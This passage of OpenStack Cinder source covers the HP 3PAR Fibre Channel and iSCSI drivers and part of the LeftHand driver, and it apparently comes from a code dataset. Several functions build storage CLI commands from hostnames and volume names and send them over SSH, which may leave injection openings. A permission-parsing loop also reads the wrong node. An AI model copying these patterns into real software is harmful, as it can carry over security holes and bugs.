        already in a vvset!
        """"""
        cmd = ['removevv', '-f', volume_name]
        LOG.debug(""Issuing remove command to find vvset name %s"" % cmd)
        out = self._cli_run(cmd)
        vvset_name = None
        if out and len(out) > 1:
            if out[1].startswith(""Attempt to delete ""):
                words = out[1].split("" "")
                vvset_name = words[len(words) - 1]

        return vvset_name

    def delete_volume(self, volume):
        try:
            volume_name = self._get_3par_vol_name(volume['id'])
            # Try and delete the volume, it might fail here because
            # the volume is part of a volume set which will have the
            # volume set name in the error.
            try:
                self.client.deleteVolume(volume_name)
            except hpexceptions.HTTPConflict as ex:
                if ex.get_code() == 34:
                    # This is a special case which means the
                    # volume is part of a volume set.
                    vvset_name = self._get_vvset_from_3par(volume_name)
                    LOG.debug(""Returned vvset_name = %s"" % vvset_name)
                    if vvset_name is not None and \
                       vvset_name.startswith('vvs-'):
                        # We have a single volume per volume set, so
                        # remove the volume set.
                        self._remove_volume_set(
                            self._get_3par_vvs_name(volume['id']))
                    elif vvset_name is not None:
                        # We have a pre-defined volume set just remove the
                        # volume and leave the volume set.
                        self._remove_volume_from_volume_set(volume_name,
                                                            vvset_name)
                    self.client.deleteVolume(volume_name)
                else:
                    raise ex

        except hpexceptions.HTTPNotFound as ex:
            # We'll let this act as if it worked
            # it helps clean up the cinder entries.
            LOG.error(str(ex))
        except hpexceptions.HTTPForbidden as ex:
            LOG.error(str(ex))
            raise exception.NotAuthorized(ex.get_description())
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex)

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        LOG.debug(""Create Volume from Snapshot\n%s\n%s"" %
                  (pprint.pformat(volume['display_name']),
                   pprint.pformat(snapshot['display_name'])))

        if snapshot['volume_size'] != volume['size']:
            err = ""You cannot change size of the volume.  It must ""
            ""be the same as the snapshot.""
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            volume_name = self._get_3par_vol_name(volume['id'])

            extra = {'volume_id': volume['id'],
                     'snapshot_id': snapshot['id']}

            volume_type = None
            type_id = volume.get('volume_type_id', None)
            vvs_name = None
            qos = {}
            hp3par_keys = {}
            if type_id is not None:
                volume_type = self._get_volume_type(type_id)
                hp3par_keys = self._get_keys_by_volume_type(volume_type)
                vvs_name = self._get_key_value(hp3par_keys, 'vvs')
                if vvs_name is None:
                    qos = self._get_qos_by_volume_type(volume_type)

            name = volume.get('display_name', None)
            if name:
                extra['display_name'] = name

            description = volume.get('display_description', None)
            if description:
                extra['description'] = description

            optional = {'comment': json.dumps(extra),
                        'readOnly': False}

            self.client.createSnapshot(volume_name, snap_name, optional)
            if qos or vvs_name is not None:
                cpg = self._get_key_value(hp3par_keys, 'cpg',
                                          self.config.hp3par_cpg)
                try:
                    self._add_volume_to_volume_set(volume, volume_name,
                                                   cpg, vvs_name, qos)
                except Exception as ex:
                    # Delete the volume if unable to add it to the volume set
                    self.client.deleteVolume(volume_name)
                    LOG.error(str(ex))
                    raise exception.CinderException(ex.get_description())
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex.get_description())

    def create_snapshot(self, snapshot):
        LOG.debug(""Create Snapshot\n%s"" % pprint.pformat(snapshot))

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            vol_name = self._get_3par_vol_name(snapshot['volume_id'])

            extra = {'volume_name': snapshot['volume_name']}
            vol_id = snapshot.get('volume_id', None)
            if vol_id:
                extra['volume_id'] = vol_id

            try:
                extra['display_name'] = snapshot['display_name']
            except AttributeError:
                pass

            try:
                extra['description'] = snapshot['display_description']
            except AttributeError:
                pass

            optional = {'comment': json.dumps(extra),
                        'readOnly': True}
            if self.config.hp3par_snapshot_expiration:
                optional['expirationHours'] = (
                    self.config.hp3par_snapshot_expiration)

            if self.config.hp3par_snapshot_retention:
                optional['retentionHours'] = (
                    self.config.hp3par_snapshot_retention)

            self.client.createSnapshot(snap_name, vol_name, optional)
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()

    def delete_snapshot(self, snapshot):
        LOG.debug(""Delete Snapshot\n%s"" % pprint.pformat(snapshot))

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            self.client.deleteVolume(snap_name)
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound as ex:
            LOG.error(str(ex))

    def _get_3par_hostname_from_wwn_iqn(self, wwns_iqn):
        out = self._cli_run(['showhost', '-d'])
        # wwns_iqn may be a list of strings or a single
        # string. So, if necessary, create a list to loop.
        if not isinstance(wwns_iqn, list):
            wwn_iqn_list = [wwns_iqn]
        else:
            wwn_iqn_list = wwns_iqn

        for wwn_iqn in wwn_iqn_list:
            for showhost in out:
                if (wwn_iqn.upper() in showhost.upper()):
                    return showhost.split(',')[1]

    def terminate_connection(self, volume, hostname, wwn_iqn):
        """"""Driver entry point to unattach a volume from an instance.""""""
        try:
            # does 3par know this host by a different name?
            if hostname in self.hosts_naming_dict:
                hostname = self.hosts_naming_dict.get(hostname)
            self.delete_vlun(volume, hostname)
            return
        except hpexceptions.HTTPNotFound as e:
            if 'host does not exist' in e.get_description():
                # use the wwn to see if we can find the hostname
                hostname = self._get_3par_hostname_from_wwn_iqn(wwn_iqn)
                # no 3par host, re-throw
                if (hostname is None):
                    raise
            else:
            # not a 'host does not exist' HTTPNotFound exception, re-throw
                raise

        #try again with name retrieved from 3par
        self.delete_vlun(volume, hostname)

    def parse_create_host_error(self, hostname, out):
        search_str = ""already used by host ""
        if search_str in out[1]:
            #host exists, return name used by 3par
            hostname_3par = self.get_next_word(out[1], search_str)
            self.hosts_naming_dict[hostname] = hostname_3par
            return hostname_3par
/n/n/ncinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR Fibre Channel Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver
""""""

from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)


class HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):
    """"""OpenStack Fibre Channel driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware,
              copy volume <--> Image.
    """"""

    def __init__(self, *args, **kwargs):
        super(HP3PARFCDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password',
                          'san_ip', 'san_login', 'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'FC'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()
        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()
        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        The  driver returns a driver_volume_type of 'fibre_channel'.
        The target_wwn can be a single entry or a list of wwns that
        correspond to the list of remote wwn(s) that will export the volume.
        Example return values:

            {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': '1234567890123',
                }
            }

            or

             {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': ['1234567890123', '0987654321321'],
                }
            }


        Steps to export a volume on 3PAR
          * Create a host on the 3par with the target wwn
          * Create a VLUN for that HOST with the volume we want to export.

        """"""
        self.common.client_login()
        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        ports = self.common.get_ports()

        self.common.client_logout()
        info = {'driver_volume_type': 'fibre_channel',
                'data': {'target_lun': vlun['lun'],
                         'target_discovered': True,
                         'target_wwn': ports['FC']}}
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['wwpns'])
        self.common.client_logout()

    def _create_3par_fibrechan_host(self, hostname, wwns, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same wwn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        command = ['createhost', '-persona', persona_id, '-domain', domain,
                   hostname]
        for wwn in wwns:
            command.append(wwn)

        out = self.common._cli_run(command)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)

        return hostname

    def _modify_3par_fibrechan_host(self, hostname, wwns):
        # when using -add, you can not send the persona or domain options
        command = ['createhost', '-add', hostname]
        for wwn in wwns:
            command.append(wwn)

        out = self.common._cli_run(command)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['FCPaths']:
                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound as ex:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_fibrechan_host(hostname,
                                                        connector['wwpns'],
                                                        domain,
                                                        persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/ncinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
""""""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """"""OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """"""
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _(""Invalid IP address format '%s'"") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _(""Found invalid iSCSI IP address(s) in configuration ""
                    ""option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'"") % \
                   ("", "".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """"""Clone an existing volume.""""""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """"""
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': ""%s:%s"" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        cmd = ['createhost', '-iscsi', '-persona', persona_id, '-domain',
               domain, hostname, iscsi_iqn]
        out = self.common._cli_run(cmd)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        command = ['createhost', '-iscsi', '-add', hostname, iscsi_iqn]
        self.common._cli_run(command)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """"""Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """"""
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _(""Least busy iSCSI port not found, ""
                        ""using first iSCSI port in list."")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """"""Return the list of candidate nsps.""""""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """"""Return IP assiciated with given nsp.""""""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """"""Return the active nsp, if one exists, for the given host.""""""
        result = self.common._cli_run(['showvlun', '-a', '-host', hostname])
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"""""Return the nsp that has the fewest active vluns.""""""
        # return only the nsp (node:server:port)
        result = self.common._cli_run(['showvlun', '-a', '-showcols', 'Port'])

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/ncinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
""""""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """"""Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """"""

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """"""Runs a CLIQ command over SSH, without doing any result parsing""""""
        cmd_list = [verb]
        for k, v in cliq_args.items():
            cmd_list.append(""%s=%s"" % (k, v))

        return self._run_ssh(cmd_list, check_exit_code)

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """"""Runs a CLIQ command over SSH, parsing and checking the output""""""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_(""CLIQ command returned %s""), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find(""response"")
            if response_node is None:
                msg = (_(""Malformed response to CLIQ command ""
                         ""%(verb)s %(cliq_args)s. Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get(""result"")

            if result_code != ""0"":
                msg = (_(""Error running CLIQ command %(verb)s %(cliq_args)s. ""
                         "" Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """"""Queries for info about the cluster (including IP)""""""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml(""getClusterInfo"", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """"""Gets the IP on which a cluster shares iSCSI volumes""""""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall(""response/cluster/vip""):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_(""Unexpected number of virtual ips for cluster ""
                 "" %(cluster_name)s. Result=%(_xml)s"") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """"""Gets the volume info, including IQN""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml(""getVolumeInfo"", cliq_args)

        # Result looks like this:
        #<gauche version=""1.0"">
        #  <response description=""Operation succeeded."" name=""CliqSuccess""
        #            processingTime=""87"" result=""0"">
        #    <volume autogrowPages=""4"" availability=""online"" blockSize=""1024""
        #       bytesWritten=""0"" checkSum=""false"" clusterName=""Cluster01""
        #       created=""2011-02-08T19:56:53Z"" deleting=""false"" description=""""
        #       groupName=""Group01"" initialQuota=""536870912"" isPrimary=""true""
        #       iscsiIqn=""iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b""
        #       maxSize=""6865387257856"" md5=""9fa5c8b2cca54b2948a63d833097e1ca""
        #       minReplication=""1"" name=""vol-b"" parity=""0"" replication=""2""
        #       reserveQuota=""536870912"" scratchQuota=""4194304""
        #       serialNumber=""9fa5c8b2cca54b2948a63d833097e1ca0000000000006316""
        #       size=""1073741824"" stridePages=""32"" thinProvision=""true"">
        #      <status description=""OK"" value=""2""/>
        #      <permission access=""rw""
        #            authGroup=""api-34281B815713B78-(trimmed)51ADD4B7030853AA7""
        #            chapName=""chapusername"" chapRequired=""true"" id=""25369""
        #            initiatorSecret="""" iqn="""" iscsiEnabled=""true""
        #            loadBalance=""true"" targetSecret=""supersecret""/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find(""response/volume"")
        for k, v in volume_node.attrib.items():
            volume_attributes[""volume."" + k] = v

        status_node = volume_node.find(""status"")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""status."" + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find(""permission"")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""permission."" + k] = v

        LOG.debug(_(""Volume info: %(volume_name)s => %(volume_attributes)s"") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """"""Creates a volume.""""""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

